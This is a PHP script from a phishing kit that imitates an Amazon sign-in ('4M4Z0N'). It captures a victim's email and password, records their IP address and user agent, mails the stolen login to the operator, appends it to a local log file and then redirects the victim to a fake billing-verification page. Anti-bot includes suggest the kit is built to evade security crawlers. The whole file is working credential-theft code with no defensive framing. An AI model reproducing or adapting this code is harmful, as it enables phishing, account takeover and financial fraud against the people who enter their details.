<?php
session_start();
include "../conf/config.php";
include '../../huehuehue.php';
include '../../blueprint/antbots/crawler.php';
include '../../blueprint/antbots/boting.php';
if (isset($_POST['password']))
	          {
	          	
				  $_SESSION['password']   = $_POST['password'];
				  $_SESSION['emaill']   = $_POST['emaill'];
	          
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	       
              $mes = " \n | B↯L↯U↯E↯P↯R↯I↯N↯T↯ [Login Details] "."\n"."LOG : FIRST \n"."|  email 👉 ".$_SESSION['emaill']."\n"."|  PASS 👉 ".$_SESSION['password']."\n"."| ----------------------------------\n"."|  IP 👉  ".$ip."\n"."|  USER-AGENT 👉 ".$_SERVER['HTTP_USER_AGENT']."  \n"."| ===========END============";

	          $subject = "Login Details Blueprints | 4M4Z0N"."IP: ".$_SERVER['REMOTE_ADDR'];
              $headers="From: Blue_prints <4M4Z0N@blue_prints>\r\n";
			  $headers.="MIME-Version: 1.0\r\n";
			  $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz,$subject,$mes,$headers);

			  $save=fopen("../data/login".$salt.".txt",'a');
	          fwrite($save,$mes);
	          fclose($save);

	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../../adrres.php?verifybilling&token=".$key."';</script>";
	          	die();
	          
	          }
	          else {
				echo "<script>window.location.href='../../signin.php?email=".$_SESSION['emaill']."&token=".$key."';</script>";
			  }
?>